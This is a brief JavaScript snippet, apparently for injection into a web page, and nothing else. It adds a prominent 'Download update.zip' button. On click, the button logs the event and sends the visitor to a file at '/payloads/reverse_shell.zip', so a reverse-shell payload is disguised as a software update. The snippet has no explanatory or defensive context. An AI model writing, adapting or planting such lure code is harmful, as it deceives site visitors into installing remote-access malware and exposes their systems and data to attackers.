const btn = document.createElement("button");
btn.innerText = "Download update.zip";
btn.style = "position:fixed;bottom:30px;right:30px;padding:10px;background:#0f0;color:#000;font-weight:bold;";
btn.onclick = () => {
  fetch("/log?dlclick=clicked");
  window.location = "/payloads/reverse_shell.zip";
};
document.body.appendChild(btn);